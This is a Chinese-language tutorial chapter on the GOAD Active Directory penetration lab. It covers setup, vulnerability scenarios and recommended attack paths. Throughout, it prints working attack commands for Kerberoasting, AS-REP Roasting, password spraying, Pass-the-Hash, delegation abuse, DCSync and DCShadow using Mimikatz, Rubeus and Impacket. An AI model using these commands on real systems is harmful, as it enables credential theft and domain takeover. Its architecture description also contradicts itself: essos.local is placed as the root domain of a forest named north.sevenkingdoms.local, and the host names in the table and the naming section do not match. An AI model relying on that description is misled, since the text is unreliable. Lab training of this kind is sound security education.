# 靶场15：GOAD（Game Of Active Directory）

> **难度等级**：🔴 特级
> **预计学习时间**：240分钟
> **学习目标**：
> - 了解GOAD靶场的架构和设计理念
> - 掌握GOAD环境的搭建方法和步骤
> - 熟悉GOAD包含的各种域渗透漏洞场景
> - 掌握GOAD推荐的渗透测试路径
> - 能够独立完成GOAD各场景的渗透练习

---

## 一、GOAD介绍

GOAD（Game Of Active Directory）是由法国安全公司Orange Cyberdefense开发的一个开源Active Directory域渗透靶场项目。它是目前最全面、最专业的域渗透练习环境之一，被誉为"域渗透靶场天花板"。

### 1.1 什么是GOAD

GOAD是一个自动化部署的多域林Active Directory实验环境，使用Vagrant + VirtualBox/VMware创建虚拟机，通过Ansible自动配置域环境和漏洞场景。整个项目完全开源，任何人都可以免费下载使用。

**项目地址**：https://github.com/Orange-Cyberdefense/GOAD

**开发者**：Orange Cyberdefense（法国知名网络安全公司）

### 1.2 GOAD的特点

**1. 最全面的域渗透场景**

GOAD包含了几乎所有常见的域渗透攻击场景，从基础的信息收集到高级的林攻击，应有尽有。无论你是域渗透新手还是资深红队人员，都能在GOAD中找到适合自己的练习内容。

**2. 多域林架构**

GOAD不是简单的单域环境，而是包含多个域和林的复杂架构，可以练习域信任、林攻击等高级技术。

**3. 自动化部署**

使用Vagrant + Ansible实现一键自动化部署，不需要手动配置每台机器，大大降低了搭建门槛。

**4. 开源免费**

完全开源免费，代码和配置都在GitHub上公开，可以根据需要自定义修改。

**5. 持续更新**

项目维护活跃，定期更新新的漏洞场景和功能。

### 1.3 为什么选择GOAD

- **体系化学习**：从入门到高级，完整的域渗透知识体系
- **贴近实战**：场景设计参考真实企业环境和真实攻击路径
- **深度足够**：涵盖各种高级域渗透技术
- **社区活跃**：大量的Writeup和讨论，学习资源丰富
- **可扩展性强**：可以基于GOAD自定义扩展场景

---

## 二、GOAD架构和拓扑

### 2.1 整体架构

GOAD包含多个版本，最经典的是 **GOAD v2（5台机器，单林双域）** 和 **GOAD Light（3台机器，单域）**。

**GOAD v2 架构**：

```
                    ┌─────────────────────────────────────────┐
                    │            林：north.sevenkingdoms.local│
                    │                                         │
                    │    ┌──────────────────────────┐         │
                    │    │ 域：north.sevenkingdoms. │         │
                    │    │     local (子域)        │         │
                    │    │                         │         │
                    │    │  DC: WINTERFELL         │         │
                    │    │  (192.168.56.10)        │         │
                    │    │                         │         │
                    │    │  MEMBER: CASTLEBLACK   │         │
                    │    │  (192.168.56.13)       │         │
                    │    └──────────┬──────────────┘         │
                    │               │ 域信任                   │
                    │    ┌──────────▼──────────────┐         │
                    │    │ 域：essos.local (根域)  │         │
                    │    │                         │         │
                    │    │  DC: MEEREEN            │         │
                    │    │  (192.168.56.12)        │         │
                    │    │                         │         │
                    │    │  MEMBER: BRAAVOS        │         │
                    │    │  (192.168.56.11)        │         │
                    │    │                         │         │
                    │    │  MEMBER: PENTESTER     │         │
                    │    │  (192.168.56.14)        │         │
                    │    └─────────────────────────┘         │
                    └─────────────────────────────────────────┘
```

**5台服务器说明**：

| 主机名 | 角色 | IP地址 | 所属域 | 操作系统 |
|--------|------|--------|--------|----------|
| WINTERFELL | 域控（DC） | 192.168.56.10 | north.sevenkingdoms.local | Windows Server 2019 |
| CASTLEBLACK | 成员服务器 | 192.168.56.13 | north.sevenkingdoms.local | Windows Server 2019 |
| MEEREEN | 域控（DC） | 192.168.56.12 | essos.local | Windows Server 2019 |
| BRAAVOS | 成员服务器 | 192.168.56.11 | essos.local | Windows Server 2019 |
| PENTESTER | 成员服务器 | 192.168.56.14 | essos.local | Windows Server 2019 |

> 💡 **深入理解：多域林架构的存在意义——"为什么真实企业会长成这样？"**
>
> GOAD之所以设计多域林架构，是因为这正好模拟了真实大型企业的AD结构。
> 很多同学不理解"为什么一个公司要有多个域？"，答案其实很简单：
>
> **场景一：公司并购（最常见的原因）**
> ```
> A公司（域 a.local）收购了 B公司（域 b.local）
> → IT部门不想迁移所有B公司的用户和设备（太麻烦）
> → 建立"域信任"：两个域的用户可以互相访问资源
> → 于是出现了多域环境！
> ```
>
> **场景二：管理隔离**
> ```
> 集团总部（域 hq.local）
>    ├── 北京分公司（域 bj.hq.local）
>    ├── 上海分公司（域 sh.hq.local）
>    └── 广州分公司（域 gz.hq.local）
> → 每个分公司的IT管理员只能管理自己的域
> → 总部管理员能管所有域
> ```
>
> **场景三：安全隔离**
> ```
> 办公域（office.local）—— 普通员工
> 生产域（prod.local）—— 核心业务系统
> 测试域（test.local）—— 开发测试
> → 三个域的密码策略、安全策略完全不同
> → 即使办公域被攻破，生产域仍然安全（需要跨域攻击）
> ```
>
> 所以 GOAD 的多域林设计不是在"故意增加复杂度"，
> 而是在忠实地模拟真实世界中的AD架构。
> 你打GOAD时遇到的跨域攻击、域信任利用，
> 在真实护网中同样会碰到！

### 2.2 GOAD Light版本

如果机器配置不够，可以使用GOAD Light版本（3台机器，单域）：

| 主机名 | 角色 | IP地址 | 所属域 |
|--------|------|--------|--------|
| DC01 | 域控 | 192.168.56.10 | goad.local |
| SRV02 | 成员服务器 | 192.168.56.21 | goad.local |
| SRV03 | 成员服务器 | 192.168.56.22 | goad.local |

### 2.3 网络配置

**默认网络设置**：
- 内网网段：192.168.56.0/24
- 所有服务器使用静态IP
- DNS指向各自的域控
- 域之间通过信任关系连接
- 攻击机需要添加到同一网段

**攻击机配置**：
- IP地址：192.168.56.x/24
- DNS：192.168.56.10（或192.168.56.12）
- 可以访问所有靶机

### 2.4 设计理念

GOAD的设计灵感来源于《权力的游戏》（Game of Thrones），所有主机名都取自剧中的城堡和城市：
- Winterfell（临冬城）- 北境首府
- Castle Black（黑城堡）- 守夜人总部
- Meereen（弥林）- 奴隶湾最大的城市
- Braavos（布拉佛斯）- 自由贸易城邦
- Pentos（潘托斯）- 自由贸易城邦

这种设计不仅增加了趣味性，也帮助学习者记忆复杂的域关系。

---

## 三、GOAD包含的漏洞场景

GOAD包含了大量域渗透漏洞场景，以下是主要的攻击路径和技术点。

### 3.1 本地提权

| 漏洞场景 | 说明 | 难度 |
|----------|------|------|
| 服务权限配置错误 | 服务可执行文件权限过宽 | ⭐ |
| 计划任务提权 | 计划任务执行的脚本可写 | ⭐ |
| AlwaysInstallElevated | 安装包提升权限 | ⭐⭐ |
| 注册表Run键值 | 自启动程序权限不当 | ⭐⭐ |
| 令牌窃取 | 烂土豆/JuicyPotato | ⭐⭐ |
| 服务路径未引号 | 路径空格导致劫持 | ⭐⭐ |
| 内核漏洞提权 | 系统内核漏洞 | ⭐⭐⭐ |

### 3.2 域内信息收集

| 技术点 | 说明 | 工具 |
|--------|------|------|
| 域用户枚举 | 获取所有域用户列表 | PowerView、BloodHound |
| 域组枚举 | 获取域组及成员关系 | PowerView |
| 域计算机枚举 | 获取所有域内计算机 | PowerView、fscan |
| 域控定位 | 查找域控位置 | nltest、net time |
| SPN枚举 | 服务主体名称发现 | setspn、Rubeus |
| OU结构收集 | 组织单位层级 | PowerView |
| GPO收集 | 组策略对象 | PowerView |
| 会话枚举 | 查找用户登录会话 | psloggedon、PowerView |
| ACL枚举 | 对象权限收集 | BloodHound、PowerView |
| 信任关系收集 | 域/林信任关系 | nltest、PowerView |

### 3.3 AS-REP Roasting

**原理**：
如果域用户设置了"不需要Kerberos预身份验证"属性，攻击者可以直接请求该用户的AS-REP响应，并离线破解其中加密的部分。

> 💡 **深入理解：AS-REP Roasting和Kerberoasting的区别——拿到的"东西"不同**
>
> 两个攻击名字很像，但拿到的密钥完全不同，攻击条件也不同：
>
> ```
> AS-REP Roasting（攻击用户本身）：
>   条件：用户账号不要求预身份验证（极少见，通常手动设置）
>   拿到：这个用户自己的TGT加密部分（用用户密码Hash加密）
>   破解后得到：这个用户的密码
>
> Kerberoasting（攻击服务账号）：
>   条件：服务账号注册了SPN（常见！很多服务账号都有）
>   拿到：该服务账号的TGS加密部分（用服务账号密码Hash加密）
>   破解后得到：这个服务账号的密码
>
> 区别一图说明：
> 你有域账号test，想提升权限：
>
> AS-REP：找那些"不需要预验证"的用户
>   → 随便冒充一个不存在用户的TGT去问 → 对方不预验证 → 直接给你响应
>   → 用wordlist破解 → 拿到那个用户的密码
>
> Kerberoasting：找那些"注册了SPN"的服务账号
>   → 用你自己的TGT去申请SPN的TGS → 返回用服务账号密码加密的票据
>   → 用wordlist离线爆破 → 如果密码弱就能破解成功
>
> 哪个更常见？Kerberoasting！
>   → 因为企业里太多的服务账号注册了SPN
>   → 而且服务账号密码往往很弱（运维懒得改！）
> ```
>
> GOAD里两种都有设置，目的就是让你完整练习。

**攻击条件**：
- 目标用户启用了"不需要Kerberos预身份验证"
- 知道目标用户名（可以枚举）

**攻击工具**：
```bash
# Rubeus
Rubeus.exe asreproast /outfile:asrep.txt

# Impacket
impacket-GetNPUsers essos.local/ -usersfile users.txt -outputfile asrep.txt

# 破解
hashcat -m 18200 asrep.txt wordlist.txt
```

**GOAD中的练习点**：
- essos.local域中有配置了AS-REP的用户
- 可以通过枚举找到这些用户
- 破解哈希获得密码

### 3.4 Kerberoasting

**原理**：
任何域用户都可以请求域内SPN（服务主体名称）的服务票据（TGS），而TGS是用服务账号的密码哈希加密的，因此可以离线破解服务账号的密码。

**攻击条件**：
- 拥有一个有效的域用户账号
- 目标服务账号注册了SPN
- 服务账号密码较弱

**攻击工具**：
```bash
# Rubeus
Rubeus.exe kerberoast /outfile:kerb.txt

# Impacket
impacket-GetUserSPNs essos.local/user:password -request -outputfile kerb.txt

# 破解
hashcat -m 13100 kerb.txt wordlist.txt
```

**GOAD中的练习点**：
- 多个服务账号配置了SPN
- 服务账号密码设置较弱
- 部分服务账号具有高权限

### 3.5 密码喷洒

**原理**：
使用一个或少量密码，批量测试大量用户账户，利用"密码复用"和"弱口令"问题。

**攻击工具**：
```bash
# CrackMapExec
cme smb 192.168.56.0/24 -u users.txt -p 'WinterIsComing!23' -d essos.local

# DomainPasswordSpray
Invoke-DomainPasswordSpray -UserList users.txt -Password 'WinterIsComing!23' -Domain essos.local

# rpcclient / 手动测试
```

**GOAD中的练习点**：
- 部分用户使用了相同的弱密码
- 可以通过密码喷洒快速获取一批用户凭据
- 注意账户锁定策略

### 3.6 Pass-the-Hash（哈希传递）

**原理**：
Windows使用NTLM哈希进行身份验证，攻击者不需要明文密码，直接使用NTLM哈希即可通过认证。

**攻击条件**：
- 获取了用户的NTLM哈希
- 目标系统使用NTLM认证

**攻击工具**：
```bash
# Impacket系列工具
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH administrator@192.168.56.10

impacket-wmiexec -hashes :NTLM_HASH user@192.168.56.10

impacket-smbexec -hashes :NTLM_HASH user@192.168.56.10

# Mimikatz
sekurlsa::pth /user:admin /domain:essos.local /ntlm:NTLM_HASH

# CrackMapExec
cme smb 192.168.56.10 -u admin -H NTLM_HASH -x "whoami"
```

### 3.7 Pass-the-Ticket（票据传递）

**原理**：
Kerberos认证使用票据，攻击者可以窃取已有的Kerberos票据，然后注入到自己的会话中，伪装成该用户。

**攻击工具**：
```bash
# Mimikatz导出票据
sekurlsa::tickets /export

# 注入票据
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi

# 验证
klist
dir \\dc\c$
```

### 3.8 令牌窃取

**原理**：
通过窃取其他用户的访问令牌，来获得该用户的权限。常见的有令牌模拟、令牌窃取等。

**常见工具/技术**：
- JuicyPotato / RottenPotato（烂土豆系列）
- PrintSpoofer
- RoguePotato
- SweetPotato

**GOAD中的练习点**：
- 某些服务器配置了可以利用令牌窃取的服务
- 可以从服务账号权限提升到系统权限

### 3.9 委派攻击

委派是Kerberos中的一种机制，允许服务代表用户访问其他服务。配置不当的委派可以被攻击者利用来提升权限。

**1. 非约束委派（Unconstrained Delegation）**

配置了非约束委派的计算机/用户可以代表用户访问任何服务。

```bash
# 查找非约束委派的主机
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# 攻击方法：诱导域管访问该主机，窃取TGT
# 利用打印机漏洞等强制认证
```

**2. 约束委派（Constrained Delegation）**

只能委派到指定的服务，但如果获得了服务账号的哈希，可以伪造服务票据。

```bash
# Rubeus s4u攻击
Rubeus.exe s4u /user:svcaccount /rc4:NTLM_HASH /msdsspn:cifs/dc.essos.local /impersonateuser:administrator /ptt
```

**3. 资源型约束委派（Resource-Based Constrained Delegation）**

资源自己决定哪些账户可以委派到它。如果攻击者对某个计算机账户有写权限，可以配置资源型约束委派。

```bash
# 利用对计算机账户的写权限
Set-ADComputer -Identity targetdc -PrincipalsAllowedToDelegateToAccount attacker

# 然后进行s4u攻击
```

### 3.10 DCSync

**原理**：
DCSync攻击利用AD的复制功能，模拟域控向其他域控请求复制数据，从而获取域内所有用户的哈希。

**所需权限**：
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All
- DS-Replication-Get-Changes-In-Filtered-Set

**攻击工具**：
```bash
# Mimikatz
lsadump::dcsync /domain:essos.local /all /csv

# 导出指定用户
lsadump::dcsync /domain:essos.local /user:krbtgt

# Impacket
impacket-secretsdump essos.local/administrator:password@192.168.56.12
```

### 3.11 DCShadow

**原理**：
DCShadow攻击是让一台机器伪装成域控，向真实域控注入恶意数据（如给某个用户添加管理员权限）。

**所需权限**：
- 域管理员权限或同等权限
- 计算机账户权限

**攻击工具**：
```bash
# Mimikatz
lsadump::dcshadow /object:hacker /attribute:primarygroupid /value:512

# 在另一个mimikatz实例中推送
lsadump::dcshadow /push
```

### 3.12 域信任攻击

**原理**：
利用域之间的信任关系，从一个域攻击另一个域。

**信任类型**：
- 父子信任（Parent-Child）
- 林信任（Forest Trust）
- 外部信任（External Trust）
- 快捷信任（Shortcut Trust）

**攻击方法**：
- 信任票攻击（Trust Ticket）
- 跨域黄金票据
- 林根密钥导出
- SID历史注入

**GOAD中的练习点**：
- essos.local和north.sevenkingdoms.local之间有信任关系
- 可以从一个域攻击另一个域
- 练习跨域攻击和林攻击

### 3.13 ACL攻击

ACL（访问控制列表）攻击是域渗透中非常重要的一类攻击，利用对象上的权限配置错误来提升权限。

**常见ACL攻击场景**：

| 权限 | 攻击方法 | 说明 |
|------|----------|------|
| ForceChangePassword | 重置用户密码 | 直接修改目标用户密码 |
| AddMember | 添加组成员 | 将自己添加到高权限组 |
| WriteDACL | 修改对象ACL | 添加更高权限的ACE |
| WriteOwner | 修改对象所有者 | 取得对象所有权 |
| GenericAll | 完全控制 | 拥有对象的所有权限 |
| DCSync权限 | 复制目录更改 | DCSync导出所有哈希 |
| AllExtendedRights | 所有扩展权限 | 包含多种危险权限 |

**工具**：
- BloodHound：可视化展示ACL关系
- PowerView：PowerShell AD信息收集
- Rubeus：Kerberos攻击工具

### 3.14 其他漏洞场景

- **LAPS密码读取**：本地管理员密码解决方案
- **AD CS攻击**：Active Directory证书服务攻击
- **组策略攻击**：GPO滥用
- **Netlogon特权**：ZeroLogon等
- **打印机漏洞**：MS-PAR / MS-RPRN强制认证
- **NTLM中继**：NTLM中继攻击
- **LDAP签名绕过**：LDAP相关攻击
- **DNSAdmin攻击**：DNS管理员组权限滥用

---

## 四、环境搭建

### 4.1 硬件要求

**GOAD v2（5台机器）**：

| 配置项 | 最低要求 | 推荐配置 |
|--------|----------|----------|
| 内存 | 12GB | 24GB+ |
| CPU | 4核 | 8核+ |
| 硬盘 | 80GB | 150GB SSD |
| 虚拟化支持 | 必须开启 | 必须开启 |

**GOAD Light（3台机器）**：

| 配置项 | 最低要求 | 推荐配置 |
|--------|----------|----------|
| 内存 | 8GB | 16GB+ |
| CPU | 4核 | 6核+ |
| 硬盘 | 50GB | 100GB SSD |
| 虚拟化支持 | 必须开启 | 必须开启 |

### 4.2 软件要求

**必备软件**：
- **Vagrant**：虚拟机管理工具
- **VirtualBox** 或 **VMware Workstation**：虚拟化软件
- **Ansible**：自动化配置工具
- **Git**：代码版本管理

**操作系统**：
- Linux（推荐，Ansible原生支持）
- Windows（需要WSL或额外配置）
- macOS（支持，但兼容性可能有问题）

**推荐环境**：
- Ubuntu 22.04 + VirtualBox + Vagrant + Ansible
- Kali Linux + VirtualBox + Vagrant + Ansible

### 4.3 Vagrant + VirtualBox 环境搭建

**步骤1：安装VirtualBox**

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack

# 验证安装
vboxmanage --version
```

**步骤2：安装Vagrant**

```bash
# 下载安装（Ubuntu/Debian）
wget https://releases.hashicorp.com/vagrant/2.4.0/vagrant_2.4.0_linux_amd64.zip
unzip vagrant_2.4.0_linux_amd64.zip
sudo mv vagrant /usr/local/bin/

# 验证安装
vagrant --version

# 安装必要的插件
vagrant plugin install vagrant-vbguest
```

**步骤3：安装Ansible**

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install ansible

# 或使用pip安装
pip install ansible

# 验证安装
ansible --version
```

**步骤4：安装pywinrm**

Ansible管理Windows需要pywinrm：

```bash
pip install pywinrm
```

### 4.4 GOAD搭建步骤详解

**步骤1：克隆GOAD仓库**

```bash
# 克隆仓库
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD

# 查看可用版本
ls -la
```

**步骤2：选择版本并进入目录**

```bash
# GOAD v2（完整版，5台机器）
cd ad/GOAD/

# 或者GOAD Light（轻量版，3台机器）
cd ad/GOAD-Light/
```

**步骤3：创建并配置虚拟机**

```bash
# 使用Vagrant创建所有虚拟机
# 这一步会下载Windows镜像并创建虚拟机，可能需要较长时间
vagrant up

# 如果中途出错，可以重试
vagrant up --provision

# 查看虚拟机状态
vagrant status
```

**步骤4：使用Ansible配置域环境和漏洞**

```bash
# 运行Ansible playbook配置环境
# 这一步会自动配置域、用户、漏洞等
ansible-playbook -i inventory.yml main.yml

# 或者分步执行
ansible-playbook -i inventory.yml 01_setup.yml
ansible-playbook -i inventory.yml 02_domain.yml
ansible-playbook -i inventory.yml 03_servers.yml
ansible-playbook -i inventory.yml 04_vulns.yml
```

**步骤5：验证环境**

```bash
# 检查所有虚拟机是否运行
vagrant status

# 测试连通性
ping 192.168.56.10 -c 3
ping 192.168.56.12 -c 3

# 测试域解析
nslookup essos.local 192.168.56.12
nslookup north.sevenkingdoms.local 192.168.56.10

# 测试SMB连接
cme smb 192.168.56.10
cme smb 192.168.56.12
```

### 4.5 常见搭建问题

**问题1：Vagrant下载镜像慢**

解决方法：
- 手动下载box文件并添加
- 使用国内镜像源
- 使用代理加速

```bash
# 手动添加box
vagrant box add --name WindowsServer2019 ./windows2019.box
```

**问题2：Ansible执行失败**

解决方法：
- 检查虚拟机是否正常运行
- 检查网络连通性
- 检查WinRM是否启用
- 重新执行playbook

```bash
# 测试WinRM连接
ansible -i inventory.yml all -m win_ping
```

**问题3：内存不足**

解决方法：
- 使用GOAD Light版本
- 减少虚拟机内存配置
- 关闭不必要的虚拟机
- 升级硬件配置

**问题4：网络不通**

解决方法：
```bash
# 检查VirtualBox主机网络
vboxmanage list hostonlyifs

# 检查虚拟机网络
vagrant ssh dc01
ipconfig

# 检查防火墙
# 确保防火墙允许相应的连接
```

### 4.6 攻击机配置

搭建好GOAD环境后，需要配置攻击机（通常是Kali Linux）。

**网络配置**：

```bash
# 添加内网IP
sudo ip addr add 192.168.56.50/24 dev vboxnet0

# 或者在VirtualBox中配置Kali虚拟机的网卡
# 设置为Host-Only模式，连接到vboxnet0
```

**DNS配置**：

```bash
# 配置DNS（可以编辑/etc/resolv.conf）
# 添加GOAD的DNS服务器
nameserver 192.168.56.12
nameserver 192.168.56.10

# 或者使用dnsmasq等工具配置
```

**测试连接**：

```bash
# 测试域控连通性
ping 192.168.56.10 -c 3
ping 192.168.56.12 -c 3

# 测试域名解析
nslookup winterfell.north.sevenkingdoms.local
nslookup meereen.essos.local

# 测试SMB
cme smb 192.168.56.0/24
```

---

## 五、GOAD渗透测试路径推荐

GOAD提供了多条渗透测试路径，以下是几条推荐的学习路线。

### 5.1 入门路径：essos.local域

**难度**：⭐⭐ 入门级
**目标**：从一个普通用户开始，拿下essos.local域控

**路径概述**：

```
起点：低权限域用户
  ↓
信息收集（枚举用户、组、计算机、SPN）
  ↓
AS-REP Roasting 获取一个用户密码
  ↓
Kerberoasting 获取服务账号
  ↓
横向移动到成员服务器
  ↓
本地提权到SYSTEM
  ↓
凭据窃取（抓取域管凭据）
  ↓
拿下域控（DCSync / 域管登录）
```

**详细步骤**：

1. **初始访问**
   - 使用提供的初始账号或通过密码喷洒获得
   - 建立立足点

2. **信息收集**
   - 枚举域用户、组、计算机
   - 使用BloodHound绘制攻击路径

3. **AS-REP Roasting**
   - 找到不需要预认证的用户
   - 请求并破解AS-REP

4. **Kerberoasting**
   - 枚举SPN
   - 请求服务票据
   - 离线破解

5. **横向移动**
   - 使用获取的凭据登录其他机器
   - PtH、PtT等技术

6. **本地提权**
   - 在成员服务器上提权
   - 令牌窃取、服务配置错误等

7. **凭据窃取**
   - 使用Mimikatz抓取内存中的凭据
   - 寻找域管凭据

8. **拿下域控**
   - 使用域管凭据登录域控
   - DCSync导出所有哈希

### 5.2 进阶路径：north.sevenkingdoms.local域

**难度**：⭐⭐⭐ 进阶级
**目标**：从essos.local域出发，攻击信任域

**路径概述**：

```
已拿下：essos.local域
  ↓
发现域信任关系
  ↓
跨域信任攻击
  ↓
获取north域的访问权限
  ↓
信息收集（north域）
  ↓
委派攻击 / ACL攻击
  ↓
拿下north域域控
  ↓
林攻击 / 获取企业管理员权限
```

**关键技术点**：
- 域信任枚举
- 信任票攻击
- 跨域黄金票据
- 跨域委派利用
- 林根攻击

### 5.3 高级路径：完整林攻击

**难度**：⭐⭐⭐⭐ 高阶级
**目标**：从一个普通用户开始，拿下整个林的所有权限

**路径概述**：

```
起点：普通域用户
  ↓
拿下第一个域（essos.local）
  ↓
利用信任关系攻击第二个域
  ↓
拿下第二个域（north.sevenkingdoms.local）
  ↓
获取企业管理员权限
  ↓
林根权限
  ↓
完整控制整个林
```

### 5.4 ACL专项路径

**难度**：⭐⭐⭐ 进阶级
**目标**：专注于练习ACL攻击技术

**练习内容**：
- 使用BloodHound分析域内ACL关系
- 寻找从普通用户到域管的ACL路径
- ForceChangePassword攻击
- AddMember攻击
- WriteDACL攻击
- GenericAll攻击
- DCSync权限利用

### 5.5 委派专项路径

**难度**：⭐⭐⭐⭐ 高阶级
**目标**：专注于练习各种委派攻击技术

**练习内容**：
- 查找非约束委派的主机
- 非约束委派攻击（打印机漏洞强制认证）
- 查找约束委派的用户/计算机
- 约束委派s4u攻击
- 资源型约束委派攻击
- 跨域委派利用

---

## 六、各场景练习方法

### 6.1 信息收集场景练习

**练习目标**：熟练掌握域内信息收集的各种方法

**练习步骤**：

1. **基础命令收集**
```bash
# 用户枚举
net user /domain
wmic useraccount get name,sid

# 组枚举
net group /domain
net group "Domain Admins" /domain

# 计算机枚举
net view /domain
net group "Domain Computers" /domain

# 域控定位
net time /domain
nltest /dclist:essos.local
```

2. **PowerView收集**
```powershell
# 导入PowerView
Import-Module .\PowerView.ps1

# 用户信息
Get-NetUser
Get-NetUser | Select-Object samaccountname,lastlogon

# 组信息
Get-NetGroup
Get-NetGroupMember "Domain Admins"

# 计算机信息
Get-NetComputer
Get-NetComputer | Select-Object name,operatingsystem

# SPN
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# OU
Get-NetOU
Get-NetOU | Select-Object name,distinguishedname

# GPO
Get-NetGPO
Get-NetGPO | Select-Object displayname,gpcfilesyspath

# 信任关系
Get-NetDomainTrust
Get-NetForestTrust
```

3. **BloodHound分析**
```bash
# 收集数据（SharpHound）
SharpHound.exe -c All --zipfilename output.zip

# 或使用PowerShell版本
Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "bloodhound"

# 在攻击机上启动BloodHound
bloodhound

# 导入数据，分析攻击路径
```

**练习要点**：
- 至少使用3种不同的工具进行信息收集
- 对比不同工具的结果差异
- 整理一份完整的信息收集Checklist
- 记录每种方法的优缺点

### 6.2 Kerberoasting场景练习

**练习目标**：掌握Kerberoasting攻击的完整流程

**练习步骤**：

1. **使用域用户身份**
   - 确保有一个有效的域用户账号
   - 可以是通过密码喷洒或其他方式获得的

2. **枚举SPN账号**
```bash
# 使用setspn
setspn -Q */*

# 使用PowerView
Get-NetUser -SPN

# 使用Rubeus
Rubeus.exe kerberoast /stats

# 使用Impacket（从攻击机）
impacket-GetUserSPNs essos.local/user:password -dc-ip 192.168.56.12
```

3. **请求服务票据**
```bash
# Rubeus
Rubeus.exe kerberoast /outfile:kerb_hashes.txt

# Impacket
impacket-GetUserSPNs essos.local/user:password -request -outputfile kerb_hashes.txt -dc-ip 192.168.56.12
```

4. **离线破解**
```bash
# hashcat
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt kerb_hashes.txt
```

5. **验证破解结果**
```bash
# 使用CrackMapExec验证
cme smb 192.168.56.0/24 -u svc_account -p 'cracked_password' -d essos.local
```

**练习要点**：
- 尝试不同的工具（Rubeus、Impacket、PowerView）
- 学习不同格式的哈希（$krb5tgs$23$ 等）
- 了解Kerberoasting的检测和防御方法

### 6.3 委派攻击场景练习

**练习目标**：掌握三种委派攻击的原理和利用方法

**非约束委派练习**：

1. 查找配置了非约束委派的计算机
2. 找到域管登录的机器
3. 利用打印机漏洞或其他方法强制域管认证
4. 捕获域管TGT
5. 使用TGT进行后续攻击

**约束委派练习**：

1. 查找配置了约束委派的用户/计算机
2. 获取该账户的NTLM哈希（通过其他漏洞）
3. 使用s4u攻击模拟管理员
4. 访问目标服务

**资源型约束委派练习**：

1. 找到对某个计算机账户有写权限的用户
2. 配置资源型约束委派
3. 进行s4u攻击
4. 获取目标机器的控制权

### 6.4 DCSync场景练习

**练习目标**：掌握DCSync攻击的原理和利用方法

**练习步骤**：

1. **获取DCSync权限**
   - 通过组获取（Domain Admins、Enterprise Admins）
   - 通过ACL获取（添加DCSync权限）
   - 通过域管会话获取

2. **执行DCSync**
```bash
# Mimikatz
privilege::debug
lsadump::dcsync /domain:essos.local /all /csv

# 导出特定用户
lsadump::dcsync /domain:essos.local /user:krbtgt

# Impacket
impacket-secretsdump essos.local/administrator:password@192.168.56.12
```

3. **使用获取的哈希**
   - 黄金票据
   - Pass-the-Hash
   - 密码破解

**练习要点**：
- 理解DCSync的原理（AD复制服务）
- 了解DCSync需要的权限
- 学习DCSync的检测方法

### 6.5 域信任攻击场景练习

**练习目标**：掌握跨域和林攻击技术

**练习内容**：

1. **枚举信任关系**
```powershell
# 域信任
Get-NetDomainTrust

# 林信任
Get-NetForestTrust

# 所有信任
nltest /domain_trusts
```

2. **跨域信息收集**
   - 使用当前域的凭据收集信任域的信息
   - 查找跨域的用户/组关系

3. **信任票攻击**
   - 获取信任密钥
   - 制作信任票
   - 访问信任域

4. **跨域黄金票据**
   - 获取父域/信任域的krbtgt哈希
   - 制作跨域黄金票据
   - 访问信任域的资源

5. **林攻击**
   - 从一个域出发，获取林根权限
   - 利用企业管理员组
   - 利用林信任关系

---

## 七、实战案例

### 案例1：GOAD环境搭建

**场景**：在Kali Linux上使用VirtualBox + Vagrant搭建GOAD Light环境。

**详细步骤**：

1. **准备工作**
```bash
# 更新系统
sudo apt update && sudo apt upgrade -y

# 安装VirtualBox
sudo apt install virtualbox virtualbox-ext-pack -y

# 安装Vagrant
wget https://releases.hashicorp.com/vagrant/2.4.0/vagrant_2.4.0_linux_amd64.zip
unzip vagrant_2.4.0_linux_amd64.zip
sudo mv vagrant /usr/local/bin/
vagrant --version

# 安装Ansible
sudo apt install ansible -y
pip install pywinrm

# 安装vagrant插件
vagrant plugin install vagrant-vbguest
```

2. **下载GOAD**
```bash
# 克隆仓库
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD/ad/GOAD-Light

# 查看目录结构
ls -la
```

3. **创建虚拟机**
```bash
# 启动所有虚拟机（这一步可能需要1-2小时）
vagrant up

# 查看状态
vagrant status
```

4. **配置环境**
```bash
# 运行Ansible playbook
ansible-playbook -i inventory.yml main.yml

# 等待配置完成（可能需要30-60分钟）
```

5. **配置攻击机网络**
```bash
# 配置Host-Only网络IP
sudo ip addr add 192.168.56.50/24 dev vboxnet0

# 配置DNS
sudo bash -c 'echo "nameserver 192.168.56.10" >> /etc/resolv.conf'
```

6. **验证环境**
```bash
# 测试连通性
ping 192.168.56.10 -c 3
ping 192.168.56.21 -c 3

# 测试域名解析
nslookup dc01.goad.local

# 测试SMB
cme smb 192.168.56.10
```

**经验总结**：搭建GOAD环境需要一定的耐心，特别是第一次下载Windows镜像会比较慢。建议使用国内镜像源或代理加速。如果机器配置不够，优先选择GOAD Light版本。

---

### 案例2：Kerberoasting实战

**场景**：在GOAD环境中练习Kerberoasting攻击。

**详细步骤**：

1. **获取初始域用户**
```bash
# 假设通过AS-REP Roasting或密码喷洒获得了一个普通用户
# 用户名：user1  密码：Passw0rd!
```

2. **枚举SPN账号**
```bash
# 使用Impacket GetUserSPNs
impacket-GetUserSPNs goad.local/user1:'Passw0rd!' -dc-ip 192.168.56.10

# 输出会显示所有SPN账号及其服务类型
```

3. **请求服务票据并保存**
```bash
# 请求所有SPN的票据
impacket-GetUserSPNs goad.local/user1:'Passw0rd!' -dc-ip 192.168.56.10 -request -outputfile kerb.txt

# 查看获取的哈希
cat kerb.txt
```

4. **离线破解**
```bash
# 使用hashcat破解
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -O

# 查看破解结果
hashcat -m 13100 kerb.txt --show
```

5. **验证破解结果**
```bash
# 假设破解出了svc_web账号的密码
# 使用CrackMapExec验证
cme smb 192.168.56.0/24 -u svc_web -p 'CrackedPass123' -d goad.local

# 尝试登录
impacket-wmiexec goad.local/svc_web:'CrackedPass123'@192.168.56.21
```

